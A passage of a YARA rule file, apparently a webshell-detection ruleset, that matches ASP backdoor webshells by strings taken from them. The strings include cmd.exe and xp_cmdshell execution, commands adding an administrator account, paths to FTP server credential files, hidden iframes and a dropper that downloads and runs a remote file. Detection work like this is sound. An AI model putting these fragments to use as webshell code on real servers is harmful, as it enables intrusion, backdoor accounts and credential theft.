        $x4 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c\"&cmdd(2))" fullword ascii
        $x5 = "WS_FTP.ini\",\"C:/Program Files/Gene6 FTP Server/RemoteAdmin/remote.ini\",\"C:/users.txt\",\"D:/users.txt\",\"E:/users.txt\")" fullword ascii
        $x6 = "Set ExCmd = Sh.Exec(\"ping -n \" & ejderpings _" fullword ascii
        $x7 = "Set colItems = objWMI.ExecQuery(\"Select * from Win32_OperatingSystem\",,48)" fullword ascii
        $s8 = "\"&oturum&\"\\ntuser.ini\",\"c:\\documents and settings\\Administrator\\ntuser.ini\")" fullword ascii
        $s9 = "yazsol(\"<b><a href=\"\"mailto:fastboy@savsak.com\"\">FASTBOY</a> : </b>Tema & Template, genel dizayn da FAstboy un tart" fullword ascii
        $s10 = "servu = array(\"C:\\Program Files\\base.ini\",\"C:\\base.ini\",\"C:\\Program Files\\Serv-U\\base.ini\",\"C:\\Program Files\\Serv" ascii
        $s11 = "yazorta(\"<b> NTUser.Dat - Log - " fullword ascii
        $s12 = "iniz port u dinleyebilirsiniz. <b>Netstat -a -b -e -n -o -r -s -v</b> gibi parametreler al" fullword ascii
        $s13 = "unu tracert yapar. <b>tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout] target_name</b> \")" fullword ascii
        $s14 = "Response.Write \"<br><center><img ALT=\"\"SaVSaK.CoM by EJDER =) \"\" src='\"&file&\"'></center><br><br>\"" fullword ascii
        $s15 = "Set objWMI = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2\")" fullword ascii
        $s16 = "response.write \"<META http-equiv=refresh content=20;URL='\"&FilePath&\"?mode=32&islem=1&url=\"&url&\"&file=\"&file&\"'>\"" fullword ascii
        $s17 = "yazsol(\"<b><a href=\"\"mailto:ejder@savsak.com\"\">EJDER</a> : Administrator & Root of <a href=\"\"hTTp://WwW.SaVSaK.CoM\"\" ta" ascii
        $s18 = "yazsol(\"<b><a href=\"\"mailto:ejder@savsak.com\"\">EJDER</a> : Administrator & Root of <a href=\"\"hTTp://WwW.SaVSaK.CoM\"\" ta" ascii
        $s19 = "yazorta(\"<b> Vti_Pvt/Access.Cnf & Postinfo & Service & Authors & Admin Pwd Sonucu by Ejder</b>\")" fullword ascii
        $s20 = "objRcs.Open inject,objConn, adOpenKeyset , , adCmdText" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_8a1591510f05a99b7bbe348e4cfb7ae33343d5b9
{
     meta:
        description = "asp - file 8a1591510f05a99b7bbe348e4cfb7ae33343d5b9.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6ade2b869ed17c04679bc5d565ba9c3ba6bc40c5b1cca198df3e0887c6b45e35"
     strings:
        $x1 = "if ShellPath=\"\" Then ShellPath = \"c:\\\\windows\\\\system32\\\\cmd.exe\"" fullword ascii
        $x2 = "Response.Write(\"Executed #\" & I + 1 & \" Without Error<BR><BR>\")" fullword ascii
        $s3 = "Set Rs = Conn.Execute(\"Select top 1 * from \" & sTable & \"\")" fullword ascii
        $s4 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
        $s5 = "set RS = Conn.Execute(cstr(sQuery),intRecordsAffected)" fullword ascii
        $s6 = "\"<option value=\"\"SELECT GETDATE() AS 'Date and Time', @@CONNECTIONS AS 'Login Attempts',@@SERVERNAME as 'SERVERNAME',@@CPU_BU" ascii
        $s7 = "Conn.Execute \"alter table \" & sTable & \" drop column \" & sField" fullword ascii
        $s8 = "\"  <tr><td class=\"\"menubar\"\"><a target=\"\"mainFrame\"\" href=\"\"?action=cmdshell\"\">DOS" fullword ascii
        $s9 = "set Rs = Conn.execute(\"Select top 1 * from \" & sTable & \"\") " fullword ascii
        $s10 = "Set Rs = Conn.Execute(sSQL)" fullword ascii
        $s11 = "Set RS = Conn.Execute(sSQL)" fullword ascii
        $s12 = "c:\\progra~1\\winrar\\rar.exe a d:\\web\\test\\web1.rar d:\\web\\test\\web1</textarea><br>\"" fullword ascii
        $s13 = "\" <TD ALIGN=\"\"Left\"\" bgcolor=\"\"#FFFFFF\"\"><input type=\"\"checkbox\"\" name=\"\"MultiExec\"\" value=\"\"yes\"\">\" & _" fullword ascii
        $s14 = "Response.Write(\"Executing #\" & I + 1 & \": \" & sSQL(i) & \"<BR>\") " fullword ascii
        $s15 = "\"<option value=\"\"SELECT GETDATE() AS 'Date and Time', @@CONNECTIONS AS 'Login Attempts',@@SERVERNAME as 'SERVERNAME',@@CPU_BU" ascii
        $s16 = "\"<form name=\"\"loginform\"\" action=\"\"?action=login\"\" method=\"\"post\"\">\" & _" fullword ascii
        $s17 = "set rs = Conn.execute(\"EXEC sp_helpfile\")" fullword ascii
        $s18 = "Conn.Execute \"DROP PROCEDURE \" & sSP" fullword ascii
        $s19 = "Conn.Execute \"DROP VIEW \" & sView" fullword ascii
        $s20 = "Conn.Execute \"Drop Table \" & sTable" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule ca1ea4d245d09fcb6a71f4295294ca1568922715
{
     meta:
        description = "asp - file ca1ea4d245d09fcb6a71f4295294ca1568922715.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "749c28ef5ed2881ee54fb13f712edb43ed65481cd8be1cb51ffa2643f6b04c19"
     strings:
        $s1 = "YPm[GZmYmVGo~x,?nD7nDcZ.nmY+68N+^YvEzf6oR;lYmVKLJ*@#@&mKxUjDDP{~JhDW7r[+M'tk^DGdK0ORxnYcrJ3GAR* Zi~fmOmPjKEMm+{J,'PU+.\\" fullword ascii
        $s2 = "1,'Pk+\"#2MR^IAbP3}4LA/YvrA:cX~Z#*@#@&/nP,l9r1)YmV6L,'PdnM.nIc/\"+CD2}ALAmDcJzf6(cZCOmVWTE#@#@&ZKUH/DI,'~JK.K\\rN" fullword ascii
        $s3 = "@!zm@*@!JY[@*@!zO.@*PJ@#@&BN4J@!O.@*@!Y9P4+rL4YxBy+B@*@!C~4D+WxEtOYalJzAShc,%O%O0FcmG:Jw.&Q?E(hkD'_u$+]A,3]9FY)w_'NKhlbxxEL" fullword ascii
        $s4 = "hW(LnmDJb@#@&w+XxJ1W:8k^Ws -mG:fk1Whc-^Ws*k^K:vk^K:{u1Gs%k1Ws,u^wDqu^wO -V2O2uVaOc-VwDXkVaY+uswO{-V2YRkVaY1E@#@&DU[a+a'k2^kOvw" fullword ascii
        $s5 = "mYrb~P,@#@&?nY~~,0~P,xP,0dGcM+OobVn`Mn$EnkYvJ;$0bs+r#bP@#@&~r6P0cCYDDk(;O+k'ZPOtnU@#@&~P6 lDY.r(EYnd{F@#@&,~" fullword ascii
        $s6 = "bP@#@&q6~\\k9`kY.kUS,kSP8bP{PEWrPr.~tk[`kOMkUBPb~P8#,xJwJ~K4+U~@#@&L,xP8*P@#@&3x9P&0~@#@&(6P\\k9c/DDrUBPkS~8#~',E" fullword ascii
        $s7 = "kkY.lOGM/SoMGEaJb@#@&sW.~Al^t,C9:r" fullword ascii
        $s8 = "~PbS~F*P{PEfE~:tnx,@#@&NPx~8&P@#@&Ax[P&W,@#@&&0,Hk9`kODbxSPb~~q*P',EmrPrM~\\k9`kY.kUS,kSP8bP{PE/rPK4n" fullword ascii
        $s9 = "Y+M@*Ebir@#@&L(JdnDKksnW!Y`rE[W1Es+UY C^V H|jm4EhC1t+. kE8:bOv#IrJBc!Z!*IJ@#@&%4r@!&d1DkaO@*r@#@&1Cd+,&@#@&d+O~1'j+M-+MR/." fullword ascii
        $s10 = "~PrS,FbP{~r+E,rMPHbNvdYMkU~,kS~8#P{~JAJP:4nx,@#@&L~'~qWP@#@&AUN,qW~@#@&qW~tk[`kOMkUBPb~P8#,xPrNEP}D~\\bN`kODbx~,rSP8#,'~J9E,K4+" fullword ascii
        $s11 = "0xELm\\lkmMrwD)oE^Vj5^?YMcJrJ[k}J/:ILJEJSELk'J*v@*r[('r@!zC@*Lx8/aIr@#@&,P,PP,P,3xGPrs@#@&~~,PP,U+XY@#@&~~P,P,P~P~j&'jqLE[" fullword ascii
        $s12 = "P^K1g?KM@#@&(0,+.D,Yung@#@&bWPAIDcH;H(2MPxPR+8c{ 8{%W&~GMP+]]c1i:~nMPx,OyFcFc+{ l,~K4+U@#@&q0,(1UYDvn.DcNA//Dr2DqG1B~JvZGU" fullword ascii
        $s13 = "@*J@#@&N8J@!/OX^+~OHw+{EJD+6D&^/kJr@* /4GSVr/DONP4G.9+DR8KYOWsl[&f2PkWVbN,qwXiNJ@#@&%8r4W9z~DN" fullword ascii
        $s14 = "/cE`ISrb@#@&xksC%4s'M+5E3jDRd2M#+\".).&bAs3k`ES}/zSmzfGIJ*@#@&)m:qG1{In}`2?DcJzmYbGUJ*@#@&IGWP2zKu'UnI7+] sbn2C:CcJcE*@#@&q" fullword ascii
        $s15 = "6O@#@&L4~dDDG4N@#@&2sk+@#@&L(Pr3DMW.\",ZCUEYP\"nl9\"J@#@&3x9P&0@#@&%8,J@!4M@*@!(D@*E@#@&nG.Db.Dmz{" fullword ascii
        $s16 = "E@*@!J2@*@!J0KDh@*E@#@&xr:m%4sPx~M+;;nkY 0K.s`Ek+Mkwr#@#@&EkD~',Dn5!+/D 0KD:vE[Ek+MJb@#@&2SN~',.+$EndDR0G.s`ENaA9Jb@#@&aWDDP{~D" fullword ascii
        $s17 = "HNBK9)BY?Ob@#@&~P,~,PoUYmDK,',(1kK]`y SOb1~rUls+'rEE~8#3v@#@&~~,P~P631GPx~&1/O.vsjKz]:~Ob1BJJrJBq#@#@&~P,P~~!nxzh+,'Pd/C?" fullword ascii
        $s18 = "~)@!&4@*@!8.@*@!t.@*r#@#@&:haPx,?aSqD`M3p`+dYc0G]s`JaGDDJ#BESJ*@#@&q2Px~kwJkDcIAp;3UKRW6\"HcJb2r#Sr~r#@#@&0K.P_j~',!~O}PE(6E" fullword ascii
        $s19 = "[N{kU/DDcdDlDBL+D/:kSE@!J?G@*E#@#@&T+O/D.'sk[cT+Ydhk~dYm.B+U9N /YmD *#@#@&nVk+@#@&T+YkOD{J" fullword ascii
        $s20 = "nCO4#@#@&G1,+I\"G]P\"+kj\\+~UA(O@#@&9ktP.dBPZ6Hg~~/:.AlhBP1Wxg?D.~,b9W1lO)dWo@#@&?AYPMj~',?AI#2] 1D3bD3r~9n/:`J)9}f$R\"n1W.9?" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_905cace691be23928a8bebff963e46141926441e
{
     meta:
        description = "asp - file 905cace691be23928a8bebff963e46141926441e.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7eb8934dbeefa3c29632dca238720a05628a2fee1bf1b4e38565cdf110567bf9"
     strings:
        $s1 = "))\"\"EMAN_TPIRCS\"\"(selbairaVrevreS.tseuqeR(htappam.revres etirw.esnopseR " fullword ascii
        $s2 = "temp = Mid(cc, i, 1) + temp" fullword ascii
        $s3 = ")\"\"tcejbOmetsySeliF.gnitpircS\"\"(tcejbOetaerC.revreS = OSFjbo teS " fullword ascii
        $s4 = "<object runat=\"server\" id=\"net\" scope=\"page\" classid=\"clsid:F935DC26-1CF0-11D0-ADB9-00C04FD58A0B\">" fullword ascii
        $s5 = "<object runat=\"server\" id=\"ws\" scope=\"page\" classid=\"clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8\">" fullword ascii
        $s6 = "<object runat=\"server\" id=\"net\" scope=\"page\" classid=\"clsid:093FF999-1EA0-4079-9525-9614C3504B74\">" fullword ascii
        $s7 = "<object runat=\"server\" id=\"ws\" scope=\"page\" classid=\"clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B\">" fullword ascii
        $s8 = "<object runat=\"server\" id=\"fso\" scope=\"page\" classid=\"clsid:0D43FE01-F093-11CF-8940-00A0C9054228\">" fullword ascii
        $s9 = "execute(UnEncode(hu))" fullword ascii
        $s10 = "\"\">aeratxet/<>23=htdiw 01=swor 08=sloc ataddfyc=eman aeratxet<\"\" etirw.esnopseR " fullword ascii
        $s11 = "\"\">p/<>b/<>tnof/<>'der'=roloc '4'=ezis tnof<>b<>'retnec'=ngila p<\"\" etirw.esnopseR " fullword ascii
        $s12 = "\"\">05=ezis 23=htdiw htapdfys=eman txet=epyt tupni<\"\" etirW.esnopseR " fullword ascii
        $s13 = ")eurT,)\"\"htapdfys\"\"(tseuqer(eliFtxeTetaerC.OSFjbo=eliFtnuoCjbo teS " fullword ascii
        $s14 = "UnEncode=temp" fullword ascii
        $s15 = "\"\">tnof/<!sseccuS evas>der=roloc tnof<\"\" etirw.esnopser " fullword ascii
        $s16 = "\"\">tnof/<!sseccuSnU evaS>der=roloc tnof<\"\" etirw.esnopser " fullword ascii
        $s17 = "raelc.rre " fullword ascii
        $s18 = "txen emuser rorre no " fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 6KB and ( 8 of them ) ) or ( all of them )
}

rule sig_55d19768fb7433023fd5ccbc718391deb61083ed
{
     meta:
        description = "asp - file 55d19768fb7433023fd5ccbc718391deb61083ed.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b0bc4091dac1057b110f2b02ce331b63cd5139056c8cdff875490c3acd19a9f5"
     strings:
        $s1 = "<%=\"<input name='pass' type='password' size='10'> <input \"%><%=\"type='submit' value='" fullword ascii
        $s2 = "<%=\"<center><br><form action='' method='post'>\"%>" fullword ascii
        $s3 = ":\"&server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii
        $s4 = "if request(\"pass\")=\"hacker!@#\" then  '" fullword ascii
        $s5 = "<%if session(\"pw\")<>\"go\" then %>" fullword ascii
        $s6 = "<%=\"<textarea name=da cols=50 rows=10 width=30></textarea>\"%>" fullword ascii
     condition:
        ( uint16(0) == 0x6d3c and filesize < 4KB and ( all of them ) ) or ( all of them )
}

rule db6681caa727d33bd0c35ec28ae961c682f4a92f
{
     meta:
        description = "asp - file db6681caa727d33bd0c35ec28ae961c682f4a92f.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "dcc843550c34495f4c7b90c6e6bdf2a537e8837b17c4ebe802067c5fee6f715a"
     strings:
        $s1 = "entrika.write \"xml.Open \"\"GET\"\",\"\"http://www35.websamba.com/cybervurgun/file.zip\"\",False\" & vbcrlf" fullword ascii
        $s2 = "entrika.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOverWrite\" & vbcrlf" fullword ascii
        $s3 = "entrika.write \"WshShell.Run \"\"c:\\downloaded.zip\"\", 0, false\" & vbcrlf" fullword ascii
        $s4 = "WshShell.Run \"c:\\net.vbs\", 0, false" fullword ascii
        $s5 = "Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)" fullword ascii
        $s6 = "entrika.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf" fullword ascii
        $s7 = "entrika.write \"Set BinaryStream = CreateObject(\"\"ADODB.Stream\"\")\" & vbcrlf" fullword ascii
        $s8 = "entrika.write \"Set xml = CreateObject(\"\"Microsoft.XMLHTTP\"\")\" & vbcrlf" fullword ascii
        $s9 = "Set entrika = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s10 = "entrika.write \"BinaryStream.Type = adTypeBinary\" & vbcrlf" fullword ascii
        $s11 = "entrika.write \"BinaryData = xml.ResponsebOdy\" & vbcrlf" fullword ascii
        $s12 = "entrika.write \"BinaryStream.Write BinaryData\" & vbcrlf" fullword ascii
        $s13 = "entrika.write \"Dim WshShell\"  & vbcrlf" fullword ascii
        $s14 = "entrika.write \"Const adTypeBinary = 1\" & vbcrlf" fullword ascii
        $s15 = "entrika.write \"Dim BinaryData\" & vbcrlf" fullword ascii
        $s16 = "entrika.write \"Dim BinaryStream\" & vbcrlf" fullword ascii
        $s17 = "entrika.write \"BinaryStream.Open\" & vbcrlf" fullword ascii
     condition:
        ( uint16(0) == 0x533c and filesize < 3KB and ( 8 of them ) ) or ( all of them )
}

rule sig_7fbd58449cae52c1525e783a129e2a6159a24722
{
     meta:
        description = "asp - file 7fbd58449cae52c1525e783a129e2a6159a24722.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3d7e1a7c12de2ddcb755a97d769df635c5a22f0ca844700129d3cdac6c65e13c"
     strings:
        $x1 = "RRS\"<tr><td height='22'><a href='http://www.8090sec.com/plus/search.php?keyword=%CC%E1%C8%A8' target='FileFrame'>  " fullword ascii
        $x2 = "></form></tr></table>\":response.write SI:SI=\"\":If trim(request.form(\"MMD\"))<>\"\"  Then:password= trim(Request.form(\"P\"))" ascii
        $x3 = "RRS\"<tr><td height='22'><a href='http://www.8090sec.com/' target='FileFrame'>  " fullword ascii
        $x4 = "<a>&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $x5 = "<a><a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\"\")'>(4)" fullword ascii
        $s6 = "<a>&nbsp;&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\RhinoSoft.com\"\")'>(3)" fullword ascii
        $s7 = "<a><a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>(5)" fullword ascii
        $s8 = "RRS\"<tr><td height='22'><a href='?Action=Cmd1Shell' target='FileFrame'>  " fullword ascii
        $s9 = "<a><a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s10 = "ser ID=\"&id:strQuery = \"exec master.dbo.xp_cMdsHeLl '\" & request.form(\"MMD\") & \"'\":set recResult = adoConn.Execute(strQue" ascii
        $s11 = "Conn.Execute(SqlStr)" fullword ascii
        $s12 = "<a><a href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\\\\Temp\"\")'>&nbsp;&nbsp;(2)" fullword ascii
        $s13 = "RRS\"function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = \"\"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" ascii
        $s14 = "RRS\"<tr><td height='22'><a href='?Action=ReadREG' target='FileFrame'>  " fullword ascii
        $s15 = "RRS\"<tr><td height='22'><a href='?Action=upload' target='FileFrame'>  " fullword ascii
        $s16 = "RRS\"<tr><td height='22'><a href='?Action=getTerminalInfo' target='FileFrame'>  " fullword ascii
        $s17 = "RRS\"<tr><td height='22'><a href='?Action=ScanPort' target='FileFrame'>  " fullword ascii
        $s18 = "RRS\"<tr><td height='22'><a href='?Action=Logout' target='_top'>  " fullword ascii
        $s19 = "RRS\"<tr><td height='22'><a href='?Action=ScanDriveForm' target='FileFrame'>  " fullword ascii
        $s20 = "execute MorfiCoder(\"/*/noitcnuF dnE/*/fi dne/*/\\*\\krowteN.tpircsW:" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_5b1dfd4bce19e770a57acacf04c724f1bb9215fe
{
     meta:
        description = "asp - file 5b1dfd4bce19e770a57acacf04c724f1bb9215fe.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b501081ab64c3de4f566b2e99ec3dc86c9c159a9f240091171a6cd2317b2c019"
     strings:
        $s1 = "set fs=server.CreateObject(\"scripting.filesystemobject\") " fullword ascii
        $s2 = "value=\"<%=server.mappath(\"go.asp\")%>\"> <BR> " fullword ascii
        $s3 = "<form method=\"POST\" ACTION=\"\"> " fullword ascii
        $s4 = "response.write \"<font color=red>no</font>\" " fullword ascii
        $s5 = "response.write \"<font color=red>ok</font>\" " fullword ascii
        $s6 = "<TEXTAREA NAME=\"Message\" ROWS=\"5\" COLS=\"40\"></TEXTAREA> " fullword ascii
     condition:
        ( uint16(0) == 0x4947 and filesize < 2KB and ( all of them ) ) or ( all of them )
}

rule sig_63b1875705ea9b9787532801b8926bdcfc3aef8e
{
     meta:
        description = "asp - file 63b1875705ea9b9787532801b8926bdcfc3aef8e.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
     strings:
        $x1 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\13cmd.exe\")&\"' size='40'>\"" fullword ascii
        $x2 = "RRS(~~)`~),~,~portForm(uest.t(req Splitmp =~)`ip~),orm(~est.F(requSplitip = ~,~)`bound to Uu = 0For h(ip)` = 0 ,~-~)p(hu)Str(iIf" ascii
        $x3 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>" fullword ascii
        $s4 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s5 = "case \"apjdel\":apjdel():case\"hiddenshell\":hiddenshell():case \"php\":php():case \"aspx\":aspx():case \"jsp\":jsp():Case \"MMD" ascii
        $s6 = "if addcode=\"\" then addcode=\"<iframe src=http://127.0.0.1/m.htm width=0 height=0></iframe>\"" fullword ascii
        $s7 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
        $s8 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
        $s9 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next" fullword ascii
        $s10 = "SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:I" ascii
        $s11 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href=\"&blogurl&\" target=_blank>" ascii
        $s12 = "ExeCute \"sub ShowErr():If Err Then:RRS\"\"<br><a href='javascript:history.back()'><br>&nbsp;\"\" & Err.Description & \"\"</a><b" ascii
        $s13 = "e=tlti' am='ssla c)'~~leFipyCo~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI~` ~ -b></>]<b> /ae<ov>M" fullword ascii
        $s14 = "rrs\"<center><h2>Fuck you,Get out!!</h2><br><a href='javascript:history.back()'>" fullword ascii
        $s15 = "e=tlti' am='ssla c)'~~leFiitEd~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI~`> /al<De'>" fullword ascii
        $s16 = "%></body><iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe></html>" fullword ascii
        $s17 = ")&chr(10):Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provid" ascii
        $s18 = "NewFolder(FName):Set ABC=Nothing:Case \"UpFile\":UpFile():Case \"Cmd1Shell\":Cmd1Shell():Case \"Logout\":Session.Contents.Remove" ascii
        $s19 = "Then:If Err.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, \"(Connect()).\") > 0 Then:RRS(targe" ascii
        $s20 = "e=tlti' am='ssla c)'~~leFiveMo~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI`>~<br><b~K)&2410e/iz.s(Lng" ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_8665821a011d918ba857e900378d03a7b091f5c1
{
     meta:
        description = "asp - file 8665821a011d918ba857e900378d03a7b091f5c1.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "70a19a46048752952ac6ce5dcafe080965152e4667ecf8f646386b4169c5f952"
     strings:
        $x1 = "Report=Report&\"<tr><td>\"&Temp&\"</td><td>Execute</td><td><font color=red>execute()" fullword ascii
        $x2 = "Report=Report&\"<tr><td>\"&Temp&\"</td><td>Server.Execute</td><td><font color=red>" fullword ascii
        $s3 = "Temp=FilePath&\"<br><a href=\"\"?filemanager=showfile&filepath=\"&tURLEncode(FilePath)&\"\"\" target=_blank>" fullword ascii
        $s4 = "Temp=ThePath&\"<br><a href=\"\"?filemanager=showfile&filepath=\"&tURLEncode(ThePath)&\"\"\" target=_blank>" fullword ascii
        $s5 = "Report=Report&\"<tr><td>\"&Temp&\"</td><td>\"&GetDateCreate(ThePath)&\"</td><td>\"&TheDate&\"</td></tr>\"" fullword ascii
        $s6 = "Set Matches=regEx.Execute(FileTxt)" fullword ascii
        $s7 = "Report=Report&\"<tr><td>\"&Temp&\"</td><td>(vbscript|jscript|javascript).Encode</td><td><font color=red>" fullword ascii
        $s8 = "regEx.Pattern=\"([^.]\\bExecute)\\b|\\b(Eval)\\b|(\\.Name\\s*=\\s*(?!=))\"" fullword ascii
        $s9 = "Temp=FilePath&\"<br><a href=\"\"http://\"&ServerName&ServerPort&\"/\"&tURLEncode(Replace(Replace(FilePath,WebSiteRoot&\"\\\",\"" ascii
        $s10 = "Temp=ThePath&\"<br><a href=\"\"http://\"&ServerName&ServerPort&\"/\"&tURLEncode(Replace(Replace(Replace(ThePath,\"\\\\\",\"\\\")" ascii
        $s11 = "Temp=FilePath&\"<br><a href=\"\"http://\"&ServerName&ServerPort&Replace(URL,FileName,\"\")&tURLEncode(Replace(Replace(FilePath,C" ascii
        $s12 = "Temp=ThePath&\"<br><a href=\"\"http://\"&ServerName&ServerPort&Replace(URL,FileName,\"\")&tURLEncode(Replace(Replace(Replace(The" ascii
        $s13 = "regEx.Pattern=\"Server.(?:Execute|Transfer)\\s*\\(\\s*[^\"\"].+\\)\"" fullword ascii
        $s14 = "regEx.Pattern=\"Server.(?:Execute|Transfer)\\s*\\(\\s*\"\"(.+)\"\"\"" fullword ascii
        $s15 = "\\\\\",\"\\\"),CurrentlyRoot&\"\\\",\"\",1,1,1),\"\\\",\"/\"))&\"\"\" target=_blank>" fullword ascii
        $s16 = "Server.execute()" fullword ascii
        $s17 = "Report=Report&\"<tr><td>\"&Temp&\"</td><td><font color=red>.CreateTextFile|.OpenTextFile</font></td><td>" fullword ascii
        $s18 = "Report=Report&\"<tr><td>\"&Temp&\"</td><td>WScript.Shell " fullword ascii
        $s19 = "Temp=Replace(Temp,\"clsid:13709620-c279-11ce-a49e-444553540000\",HLCStr&\"clsid:13709620-c279-11ce-a49e-444553540000</span>\")" fullword ascii
        $s20 = "Temp=Replace(Temp,\"clsid:72c24dd5-d70a-438b-8a42-98424b88afb8\",HLCStr&\"clsid:72c24dd5-d70a-438b-8a42-98424b88afb8</span>\")" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 70KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule e9a7aa5eb1fb228117dc85298c7d3ecd8e288a2d
{
     meta:
        description = "asp - file e9a7aa5eb1fb228117dc85298c7d3ecd8e288a2d.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "eb1abe5d2f86693e6cebef14ab70b2664fdd5c49d6b82d5303259ac37a652180"
     strings:
        $s1 = "nda </a> - <a href=\"javascript:void(0);\" onclick=\"javascript:Start ('?kullanim');\">Kullan" fullword ascii
        $s2 = "<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>" fullword ascii
        $s3 = "/wGUk+ hMrD+~rJLYEk[rE@#@&+UN,/;8@#@&B RO OO RRO O ORORR OR@#@&dE(P^Ck+%@#@&M+dwKUk+ SDbY+,J@!8D@*@!8D@*@!^n" fullword ascii
        $s4 = "document.write('<span id=\"typinglight\">'+message.charAt(m)+'</span>')" fullword ascii
        $s5 = "'+@*@!Vk@*ASh /m8KYCT+ Y+m:cGDTPSPShA kl\\kC3cmWs~SPShSRhkUr" fullword ascii
        $s6 = "document.write('<font face=\"'+fontface+'\" size=\"'+fontsize+'\" color=\"'+typingbasecolor+'\">')" fullword ascii
        $s7 = "y,)~hmkV8Gs4@$tKOslr^R1W:,~,4W^X[+sWU@$4WYsCk^RmKh~~,hSh /CUmVO+MGDcW.L,/kOnsk\"N" fullword ascii
        $s8 = "var tempref=document.all.typinglight" fullword ascii
        $s9 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword ascii
        $s10 = "21212; border-right:1px solid #5d5d5d; border-bottom:1px solid #5d5d5d; border-top:1px solid #121212;}</style>" fullword ascii
        $s11 = "nDexEr - Reader\"" fullword ascii
        $s12 = "<td><font color=pink>Oku :</font><td><input type=\"text\" name=\"klasor\" size=25 value=<%=#@~^LQAAAA==." fullword ascii
        $s13 = "OpenWin = this.open(page, \"CtrlWindow\",\"toolbar=menubar=No,scrollbars=No,status=No,height=250,\");" fullword ascii
        $s14 = "hP~k^orVn.b@!8D@*@!0KxO~1WVG.{h4kDn,/r.+{ @*@!z1nxD+.@*@!0GUDP/b\"+{F@*@!sr@*g+MNnx_~~E.lHCPzYC^m" fullword ascii
        $s15 = "<a href=\"javascript:void(0);\" onclick=\"javascript:Start ('?hakkinda');\">" fullword ascii
